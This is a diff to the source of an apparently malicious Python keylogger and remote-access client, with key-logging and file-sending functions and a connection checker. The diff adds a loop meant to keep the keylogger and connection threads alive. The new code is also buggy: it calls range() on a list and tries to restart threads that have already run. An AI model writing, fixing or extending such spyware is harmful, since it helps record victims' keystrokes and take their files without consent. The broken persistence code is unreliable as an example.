@@ -21,11 +21,13 @@ connected = False
 stop = False
 runThread = True
 keyLog = True
+initialized = False
 
 #Timer to check the connection (seconds)
 checkerTimeout = 1.5
 log = ""
 logs = True
+threads = []
 ################################
 
 def connect():
@@ -418,6 +420,13 @@ def sendFileByteMode(file):
         logEvents(e)       
         stop = False  
 
+def threadPersistFunction():
+    global threads
+    while True:
+        for thread in threads:
+            if not thread.is_alive():
+                thread.start()
+
 #CHECKS THE CONNECTION BY PING/PONG METHOD
 def checkConnection():
     global runThread
@@ -443,12 +452,21 @@ def checkConnection():
             conn = None
             connected = False
             
-
 if __name__ == '__main__':
-    thread = threading.Thread(target=checkConnection)
-    thread.start()
-    keyThread = threading.Thread(target=kLogger)
-    keyThread.start()
+    
+    if not initialized:
+        thread = threading.Thread(target=checkConnection)
+        thread.start()
+        keyThread = threading.Thread(target=kLogger)
+        keyThread.start()
+        threads.append(threading.main_thread())
+        threads.append(thread)
+        threads.append(keyThread)
+        initialized = True
+    for i in range(threads):
+        persistThread = threading.Thread(target=threadPersistFunction)
+        persistThread.start()
+        threads.append(persistThread)
     while True:
         if connected:
             time.sleep(1)
@@ -457,4 +475,3 @@ if __name__ == '__main__':
                 dataTemp = None
         else:
             time.sleep(4)
-       
